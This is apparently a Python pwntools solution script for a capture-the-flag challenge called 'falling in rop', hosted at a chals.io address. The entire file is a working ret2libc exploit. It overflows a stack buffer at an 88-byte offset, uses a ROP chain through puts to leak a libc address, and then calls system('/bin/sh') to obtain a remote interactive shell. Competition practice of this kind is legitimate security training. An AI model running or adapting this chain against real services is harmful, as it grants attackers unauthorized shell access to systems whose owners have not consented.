from pwn import *
p = remote("spaceheroes-falling-in-rop.chals.io", 443, ssl=True, sni="spaceheroes-falling-in-rop.chals.io")

#p = process('./falling.bin')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e = ELF('./falling.bin')
rop = ROP(e)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
puts_got = e.got['puts']
puts_plt = e.plt['puts']
binsh = next(e.search(b'/bin/sh\x00'))
main = 0x4011d2
offset = 88


payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recvuntil(b"Tell me who you are:")
p.sendline(payload)

puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts - libc.symbols['puts']
log.info(f'puts: {hex(puts)}')
log.info(f'libc: {hex(libc.address)}')



p.recvuntil(b"Tell me who you are:")

payload = b'A' * offset
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.interactive()